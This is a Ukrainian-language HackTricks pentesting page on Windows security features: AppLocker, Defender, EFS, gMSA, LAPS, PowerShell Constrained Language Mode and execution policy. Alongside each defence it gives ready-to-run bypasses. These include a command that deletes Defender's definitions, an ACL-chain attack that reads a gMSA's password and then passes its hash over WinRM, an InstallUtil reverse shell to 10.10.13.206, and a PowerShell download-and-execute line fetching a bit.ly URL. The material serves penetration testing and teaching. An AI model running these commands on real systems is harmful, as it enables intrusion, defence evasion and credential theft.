# Засоби безпеки Windows

{{#include ../../banners/hacktricks-training.md}}

## Політика AppLocker

Білий список застосунків — це перелік схвалених програм або виконуваних файлів, яким дозволено бути присутніми в системі та запускатися в ній. Мета полягає в захисті середовища від шкідливого malware і несхваленого програмного забезпечення, яке не відповідає конкретним бізнес-потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) — це **рішення Microsoft для внесення застосунків до білого списку**, яке надає системним адміністраторам контроль над тим, **які застосунки та файли можуть запускати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами інсталятора Windows, DLL, пакетними застосунками та інсталяторами пакетних застосунків.\
Організації часто **блокують cmd.exe і PowerShell.exe** та доступ на запис до певних каталогів, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення внесені до чорного/білого списку:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, що дає змогу переглянути поточний набір правил, які застосовуються в системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Корисні **доступні для запису папки** для обходу політики AppLocker: якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, існують **доступні для запису папки**, які можна використати, щоб **обійти це**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Зазвичай **trusted** бінарні файли [**"LOLBAS's"**](https://lolbas-project.github.io/) також можуть бути корисними для обходу AppLocker.
- **Погано написані правила також можна обійти**
- Наприклад, для **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** можна створити **папку з назвою `allowed`** у будь-якому місці, і вона буде дозволена.
- Організації також часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**місця розташування виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **DLL enforcement дуже рідко вмикають** через додаткове навантаження, яке це може створити для системи, а також через обсяг тестування, необхідного для того, щоб переконатися, що нічого не зламається. Тому використання **DLL як backdoors допоможе обійти AppLocker**.
- Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати** код **Powershell** у будь-якому процесі й обходити AppLocker. Для отримання додаткової інформації див.: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Зберігання облікових даних

### Security Accounts Manager (SAM)

Локальні облікові дані містяться в цьому файлі, паролі хешуються.

### Local Security Authority (LSA) - LSASS

**Облікові дані** (хешовані) **зберігаються** в **пам’яті** цієї підсистеми для Single Sign-On.\
**LSA** адмініструє локальну **політику безпеки** (політику паролів, дозволи користувачів...), **автентифікацію**, **токени доступу**...\
LSA перевіряє **надані облікові дані** у файлі **SAM** (для локального входу) та взаємодіє з **контролером домену**, щоб автентифікувати користувача домену.

**Облікові дані** **зберігаються** всередині **процесу LSASS**: квитки Kerberos, хеші NT і LM, паролі, які легко розшифрувати.

### Секрети LSA

LSA може зберігати деякі облікові дані на диску:

- Пароль облікового запису комп’ютера в Active Directory (недоступний контролер домену).
- Паролі облікових записів служб Windows
- Паролі для scheduled tasks
- Інше (пароль застосунків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона присутня лише на контролерах домену.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — це Antivirus, доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** поширені інструменти pentesting, такі як **`WinPEAS`**. Однак існують способи **обійти цей захист**.

### Перевірка

Щоб перевірити **стан** **Defender**, можна виконати PS cmdlet **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи він активний):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Щоб також зібрати інформацію про нього, можна виконати:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Зашифрована файлова система (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ**, відомий як **File Encryption Key (FEK)**. Цей ключ шифрується за допомогою **відкритого ключа** користувача та зберігається в **альтернативному потоці даних** $EFS зашифрованого файлу. Коли потрібне розшифрування, відповідний **закритий ключ** цифрового сертифіката користувача використовується для розшифрування FEK із потоку $EFS. Докладнішу інформацію наведено [тут](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Сценарії розшифрування без ініціації користувачем** включають:

- Коли файли або папки переміщуються до файлової системи без підтримки EFS, як-от [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, надіслані мережею через протокол SMB/CIFS, розшифровуються перед передаванням.

Цей метод шифрування забезпечує **прозорий доступ** власника до зашифрованих файлів. Однак проста зміна пароля власника та вхід до системи не дасть змоги розшифрувати файли.

**Основні висновки**:

- EFS використовує симетричний FEK, зашифрований відкритим ключем користувача.
- Для розшифрування використовується закритий ключ користувача, щоб отримати доступ до FEK.
- Автоматичне розшифрування відбувається за певних умов, наприклад під час копіювання до FAT32 або передавання мережею.
- Власник може отримувати доступ до зашифрованих файлів без додаткових дій.

### Перевірка інформації про EFS

Перевірте, чи **користувач** **використовував** цю **службу**, перевіривши наявність цього шляху:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу, за допомогою cipher /c \<file>\
Також можна використовувати `cipher /e` і `cipher /d` усередині папки, щоб **зашифрувати** та **розшифрувати** всі файли

### Розшифрування файлів EFS

#### Отримання Authority System

Цей спосіб вимагає, щоб **користувач-жертва** мав **запущений** **процес** на хості. Якщо це так, використовуючи сеанс `meterpreter`, можна видати себе за токен процесу користувача (`impersonate_token` з `incognito`). Або можна просто виконати `migrate` до процесу користувача.

#### Знання пароля користувача

Mimikatz описує, як імпортувати матеріали сертифіката/закритого ключа користувача та розшифровувати файли, захищені EFS, якщо пароль відомий.<sup>[[6]](#references)</sup>

## Керовані групові службові облікові записи (gMSA)

Microsoft розробила **Group Managed Service Accounts (gMSA)**, щоб спростити керування службовими обліковими записами в ІТ-інфраструктурах. На відміну від традиційних службових облікових записів, для яких часто ввімкнено параметр "**Password never expire**", gMSA пропонують безпечніше рішення, яким простіше керувати:

- **Автоматичне керування паролями**: gMSA використовують складний пароль довжиною 240 символів, який автоматично змінюється відповідно до політики домену або комп'ютера. Цей процес обробляється Microsoft's Key Distribution Service (KDC), що усуває потребу в ручному оновленні паролів.
- **Підвищена безпека**: ці облікові записи не піддаються блокуванню та не можуть використовуватися для інтерактивного входу, що підвищує їхню безпеку.
- **Підтримка кількох хостів**: gMSA можна спільно використовувати на кількох хостах, що робить їх ідеальними для служб, які працюють на кількох серверах.
- **Можливість виконання Scheduled Task**: на відміну від керованих службових облікових записів, gMSA підтримують виконання запланованих завдань.
- **Спрощене керування SPN**: система автоматично оновлює Service Principal Name (SPN), коли змінюються відомості sAMaccount комп'ютера або його DNS-ім'я, що спрощує керування SPN.

Паролі gMSA зберігаються у властивості LDAP _**msDS-ManagedPassword**_ і автоматично скидаються кожні 30 днів контролерами домену (DC). Цей пароль, зашифрований двійковий об'єкт даних, відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), можуть отримати лише авторизовані адміністратори та сервери, на яких встановлено gMSA, що забезпечує захищене середовище. Для доступу до цієї інформації потрібне захищене з'єднання, наприклад LDAPS, або з'єднання має бути автентифіковане за допомогою 'Sealing & Secure'.

![Ретрансляція автентифікації NTLM для отримання пароля gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Прочитати цей пароль можна за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Знайдіть більше інформації в архівованому оригінальному дослідженні**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

У цьому ж дослідженні пояснюється, як **NTLM relay attack** може отримати **пароль gMSA**, якщо relayed principal має дозвіл на читання `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Зловживання ланцюжком ACL для читання керованого пароля gMSA (GenericAll -> ReadGMSAPassword)

У багатьох середовищах користувачі з низькими привілеями можуть отримати доступ до секретів gMSA без компрометації DC, зловживаючи неправильно налаштованими ACL об’єктів:<sup>[[3]](#references)</sup>

- Групі, яку ви можете контролювати (наприклад, через GenericAll/GenericWrite), надано `ReadGMSAPassword` для gMSA.
- Додавши себе до цієї групи, ви успадковуєте право читати blob `msDS-ManagedPassword` gMSA через LDAP і отримуєте придатні для використання облікові дані NTLM.

Типовий процес:

1) Знайдіть шлях за допомогою BloodHound і позначте свої foothold principals як Owned. Шукайте такі зв’язки:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Додайте себе до проміжної групи, яку ви контролюєте (приклад із bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Прочитайте керований пароль gMSA через LDAP і виведіть хеш NTLM. NetExec автоматизує отримання `msDS-ManagedPassword` і перетворення на NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Автентифікуйтеся як gMSA за допомогою NTLM-хешу (plaintext не потрібен). Якщо обліковий запис входить до Remote Management Users, WinRM працюватиме безпосередньо:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- Читання LDAP атрибута `msDS-ManagedPassword` потребує sealing (наприклад, LDAPS/sign+seal). Tools виконують це автоматично.
- gMSA часто надаються локальні права, як-от WinRM; перевіряйте членство в групах (наприклад, Remote Management Users), щоб планувати lateral movement.
- Якщо вам потрібен лише blob для самостійного обчислення NTLM, дивіться структуру MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, доступний для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), забезпечує керування паролями локального Administrator. Ці паролі, які є **рандомізованими**, унікальними та **регулярно змінюються**, централізовано зберігаються в Active Directory. Доступ до цих паролів обмежується за допомогою ACL для авторизованих користувачів. За наявності достатніх дозволів стає можливим читання паролів локального адміністратора.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато функцій**, необхідних для ефективного використання PowerShell, зокрема блокує COM-об’єкти, дозволяє використовувати лише схвалені типи .NET, робочі процеси на основі XAML, класи PowerShell тощо.

### **Перевірка**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
У поточних версіях Windows цей bypass більше не працює, але можна використати [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Для його компіляції може знадобитися** **додати** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проєкт на .Net4.5**.

#### Прямий bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати код Powershell** у будь-якому процесі та обходити constrained mode. Докладніше дивіться: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

За замовчуванням встановлено значення **restricted.** Основні способи обходу цієї політики:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Більше інформації можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Це API, який можна використовувати для автентифікації користувачів.

SSPI вибирає відповідний протокол автентифікації для двох машин, що взаємодіють, надаючи перевагу Kerberos, якщо він доступний. Ці протоколи реалізовані Security Support Providers (SSPs), які встановлюються у Windows як DLL; обидва вузли повинні підтримувати узгоджений провайдер.

### Основні SSPs

- **Kerberos**: Пріоритетний
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** і **NTLMv2**: З міркувань сумісності
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Вебсервери та LDAP, пароль у формі MD5-хешу
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL і TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Використовується для узгодження протоколу (Kerberos або NTLM, причому Kerberos є протоколом за замовчуванням)
- %windir%\Windows\System32\lsasrv.dll

#### Узгодження може запропонувати кілька методів або лише один.

## UAC - Керування обліковими записами користувачів

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка вмикає **запит на підтвердження для дій із підвищеними привілеями**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Ретрансляція для gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA через ланцюжок прав до WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Обхід AppLocker і PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 способів обійти PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ розшифрувати файли EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
